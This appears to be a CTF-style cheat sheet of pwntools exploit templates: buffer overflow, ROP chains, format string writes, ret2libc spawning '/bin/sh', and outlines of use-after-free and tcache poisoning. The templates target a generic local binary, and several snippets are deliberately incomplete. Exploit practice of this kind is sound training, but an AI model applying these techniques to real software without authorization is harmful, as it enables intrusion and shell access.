# Exploitation Templates

## Basic Buffer Overflow
```python
from pwn import *
context.binary = elf = ELF('./binary')

p = process('./binary')
offset = 72  # Find with cyclic pattern
payload = flat({offset: elf.symbols['win']})
p.sendline(payload)
p.interactive()
```

## ROP Chain
```python
from pwn import *
elf = ELF('./binary')
rop = ROP(elf)

# Leak libc
rop.puts(elf.got['puts'])
rop.main()

# Second stage with libc
libc.address = leak - libc.symbols['puts']
rop2 = ROP(libc)
rop2.system(next(libc.search(b'/bin/sh\x00')))
```

## Format String
```python
from pwn import *
# Leak addresses
for i in range(1, 20):
    p.sendline(f'%{i}$p'.encode())

# Write value
writes = {target: value}
payload = fmtstr_payload(offset, writes)
```

## ret2libc
```python
from pwn import *
elf = ELF('./binary')
libc = ELF('./libc.so.6')

# Leak libc address
p.sendline(payload_leak)
leak = u64(p.recv(6).ljust(8, b'\x00'))
libc.address = leak - libc.symbols['puts']

# Call system("/bin/sh")
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]  # Stack alignment
payload = flat({
    offset: ret,
    offset+8: pop_rdi,
    offset+16: next(libc.search(b'/bin/sh\x00')),
    offset+24: libc.symbols['system']
})
```

## Heap - Use After Free
```python
from pwn import *
# 1. Allocate chunk A
# 2. Free chunk A
# 3. Allocate chunk B (same size, reuses A's memory)
# 4. Use dangling pointer to A -> controls B's data
```

## Heap - Tcache Poisoning (glibc 2.27+)
```python
# 1. Free chunk A, B (same size)
# 2. Overwrite A's fd pointer
# 3. Allocate twice -> get arbitrary write
```
